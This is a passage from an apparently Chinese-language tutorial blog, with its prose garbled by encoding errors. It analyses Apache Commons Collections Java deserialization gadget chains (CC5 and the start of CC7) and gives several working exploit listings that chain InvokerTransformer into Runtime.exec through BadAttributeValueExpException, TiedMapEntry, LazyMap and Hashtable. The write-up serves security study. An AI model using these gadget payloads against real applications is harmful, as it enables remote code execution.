<p>ä¸€ç›´å¾ˆå¥½å¥‡è¿™ç§é“¾å­æ˜¯æ€ä¹ˆæ‰¾å‡ºæ¥çš„ã€‚ã€‚æ‹¿<code>toString()</code>è¿™ç§æ–¹æ³•æ¥è¯´ï¼Œç”¨æ³•å¯èƒ½æœ‰æˆç™¾ä¸Šåƒä¸ªï¼Œèƒ½åœ¨è¿™ä¹ˆå¤šç”¨æ³•ä¸­æ‰¾å‡ºèƒ½ç”¨çš„ä¹Ÿå¤ªåŠäº†</p>
<p>è°ƒç”¨äº†<code>getKey()</code>å’Œ<code>getValue()</code>æ–¹æ³•,<code>getValue()</code>æ–¹æ³•è°ƒç”¨äº†<code>get()</code>æ–¹æ³•ï¼š</p>
<p><img src="/img/CC53.png" srcset="/img/loading.gif" lazyload alt="CC53"></p>
<p><code>map.get()</code>ï¼Œè¿™å°±å›åˆ°äº†<code>CC1</code>é‡Œ<code>Lazymap</code>é‚£æ¡é“¾å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// LazyMap ååŠæ®µçš„ EXPpublic class LazyMapGetEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br>  <br> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">lazyGetMethod</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredMethod(<span class="hljs-string">&quot;get&quot;</span>, Object.class);  <br> lazyGetMethod.setAccessible(<span class="hljs-literal">true</span>);  <br> lazyGetMethod.invoke(decorateMap, <span class="hljs-string">&quot;everything!&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨åå°„ç›´æ¥è°ƒç”¨äº†<code>get</code>æ–¹æ³•å¼¹å‡ºè®¡ç®—å™¨ã€‚æ¥ä¸‹æ¥åˆ©ç”¨<code>TiedMapEntry</code> ç±»è°ƒç”¨ <code>toString()</code>è¿›è€Œè°ƒç”¨<code>get</code>æ–¹æ³•ï¼š</p>
<p><img src="/img/CC5.png" srcset="/img/loading.gif" lazyload alt="CC5"></p>
<p>EXP:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// TiedMapEntry çš„ EXP ç¼–å†™  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntryEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br> <span class="hljs-comment">//ä¸Šé¢éƒ½ä¸€æ ·ï¼Œå°±æ˜¯æ¢äº†ä¸ªæ–¹æ³•è§¦å‘getæ–¹æ³•</span><br> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(decorateMap, <span class="hljs-string">&quot;value&quot;</span>);  <br> tiedMapEntry.toString();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>å‰é¢è¯´äº†å…¥å£æ˜¯ <code>BadAttributeValueExpException</code> çš„ <code>readObject()</code> ï¼Œ<code>new</code>ä¸€ä¸ªä¹‹å ç»™<code>val</code>èµ‹å€¼ä¸º<code>TiedMapEntry</code>çš„å®ä¾‹å°±è¡Œï¼Œç„¶ååºåˆ—åŒ–ï¼Œååºåˆ—åŒ–æ—¶å°±èƒ½è§¦å‘äº†ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> entity;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">// TiedMapEntry çš„ EXP ç¼–å†™</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntryEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br>        <span class="hljs-comment">//ä¸Šé¢éƒ½ä¸€æ ·ï¼Œå°±æ˜¯æ¢äº†ä¸ªæ–¹æ³•è§¦å‘getæ–¹æ³•</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(decorateMap, <span class="hljs-string">&quot;value&quot;</span>);<br>		<span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>); <br>		<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);  <br>		field.setAccessible(<span class="hljs-literal">true</span>);  <br>		field.set(badAttributeValueExpException, tiedMapEntry);<br>		serialize(badAttributeValueExpException);  <br>	    unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è°ƒç”¨é¡ºåºï¼š</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs coq">BadAttributeValueExpException.readObject-&gt;TiedMapEntry.toString<br>-&gt;LazyMap.get-&gt;ChainedTransformer.transform<br>-&gt;ConstantTransformer.transform-&gt;InvokerTransformer.transform<br>-&gt;Method.invoke-&gt;<span class="hljs-keyword">Class</span>.getMethod<br>-&gt;InvokerTransformer.transform-&gt;Method.invoke<br>-&gt;Runtime.getRuntime-&gt; InvokerTransformer.transform<br>-&gt;Method.invoke-&gt;Runtime.exec<br></code></pre></td></tr></table></figure>

<h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><p>ä¸»è¦å‚è€ƒäº†è¿™ä¸¤ä½å¸ˆå‚…çš„æ–‡ç« ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10457">1</a></p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE/">2</a></p>
<p>ååŠæ¡é“¾å­ä¸CC1ç›¸åŒï¼Œå‰åŠéƒ¨åˆ†å…¥å£ç±»ä¸ºï¼š<code>Hashtable</code>ï¼Œå®ƒçš„<code>readObject</code>æ–¹æ³•è°ƒç”¨äº†ä¸€ä¸ª<code>reconstitutionPut</code>æ–¹æ³•ï¼š</p>
<p><img src="/img/HashtableReadObject.png" srcset="/img/loading.gif" lazyload alt="HashtableReadObject"></p>
<p>è·Ÿè¿›è¿™ä¸ª<code>reconstitutionPut</code>:</p>
<p><img src="/img/CC701.png" srcset="/img/loading.gif" lazyload alt="CC701"></p>
<p>è¿™é‡Œæœ‰ä¸¤ä¸ªå¯ç”¨çš„æ–¹æ³•ï¼š<code>equals()</code> å’Œ <code>hashCode()</code>ã€‚(è¿™é‡Œæœ‰ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼šä¸ç®¡æ˜¯<code>reconstitutionPut</code>æ–¹æ³•è¿˜æ˜¯<code>equals</code>æ–¹æ³•ï¼Œéƒ½å¾—å…ˆè¿›<code>for</code>å¾ªç¯æ‰è¡Œ)ã€‚<code>hashCode</code>çš„è¯å°±æ˜¯CC6é‚£æ¡ï¼Œå…ˆçœ‹<code>equals</code>ï¼š</p>
<p><code>AbstractMap</code> ç±»ä¸­çš„ <code>equals()</code> æ–¹æ³•ä¸­å‘ç°å…¶è°ƒç”¨äº† <code>get()</code> æ–¹æ³•ï¼š</p>
<p><img src="/img/AbstractMap.png" srcset="/img/loading.gif" lazyload alt="AbstractMap"></p>
<p>è¿™é‡Œ<code>equals</code>æ¥å—ä¸€ä¸ª<code>object o </code>ï¼Œç„¶åæŠŠè¿™ä¸ª<code>o</code>ä¼ ç»™<code>m</code>ï¼Œå³<code>reconstitutionPut</code>ä¸­çš„<code>key</code></p>
<p>å…¶å®å°±æ˜¯é€šè¿‡<code>AbstractMap#equals</code>æ¥è°ƒç”¨<code>LazyMap#get</code>ã€‚ç°åœ¨è¯•ç€åˆ†æä¸€ä¸‹è¿™ä¸ªâ€™â€™æ–°çš„â€™â€™<code>CC1</code>å‰åŠéƒ¨åˆ†ï¼š</p>
<p><code>reconstitutionPut</code>:</p>
<p><img src="/img/HashTable.png" srcset="/img/loading.gif" lazyload alt="HashTable"></p>
<p>è¿™é‡Œå¯¹ä¼ è¿›çš„ Entry å¯¹è±¡æ•°ç»„è¿›è¡Œäº†å¾ªç¯ï¼Œé€ä¸ªè°ƒç”¨<code>e.key.equals(key)</code>ï¼Œè¿™é‡Œçš„<code>e</code>å°±æ˜¯ä¸ªç´¢å¼•ã€‚ä¼ è¿›å»çš„å‚æ•°keyå¦‚æœæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œé‚£ä¹ˆ<code>AbstractMap.equals()</code>ä¸­çš„må°±æ˜¯æˆ‘ä»¬å¯æ§çš„(é€»è¾‘å°±æ˜¯<code>equals</code>æ¥å—çš„å‚æ•°æ˜¯<code>Object o</code>ï¼Œç„¶å<code>Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</code>)ã€‚æœ€åè¦æ³¨æ„è¿™ä¸¤ä¸ª<code>key</code>ï¼š<code>e.key.equals(key)</code>ï¼Œå‰é¢é‚£ä¸ª<code>e.key</code> æ˜¯è¯¥æ¡ç›®çš„é”®ï¼Œè€Œ <code>key</code> æ˜¯ä½œä¸ºå‚æ•°ä¼ é€’ç»™ <code>reconstitutionPut</code> æ–¹æ³•çš„é”®ã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨åºåˆ—åŒ–æ—¶å¯ä»¥åˆ©ç”¨<code>put</code>ç»™<code>hashtable</code>æ”¾ä¸€ä¸ª<code>key</code>&#x3D;æ¶æ„ç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();  <br>hashtable.put(decorateMap, <span class="hljs-string">&quot;Drunkbaby&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>ç„¶ååºåˆ—åŒ–åç”¨ååºåˆ—åŒ–è§¦å‘ä»–ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.util.*;  <br>  <br><span class="hljs-comment">// AbstractMap çš„ EXPpublic class AbstractMapEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br>  <br> <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();  <br> hashtable.put(decorateMap, <span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-comment">//serialize(hashtable);  </span><br> <span class="hljs-comment">//unserialize(&quot;ser.bin&quot;);  </span><br> &#125;  <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä½†è¿™æ—¶è¿è¡Œå¹¶ä¸ä¼šå¼¹è®¡ç®—å™¨ï¼Œæ–­ç‚¹æ‰“åœ¨<code>AbstractMap.equals()</code>ç„¶åè°ƒè¯•ä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°å¹¶æ²¡æœ‰è¿›åˆ°<code>equals</code>é‡Œé¢ï¼Œå®˜æ–¹é“¾å­å†™æ³•å¦‚ä¸‹ï¼š</p>
<p><img src="/img/yso.png" srcset="/img/loading.gif" lazyload alt="yso"></p>
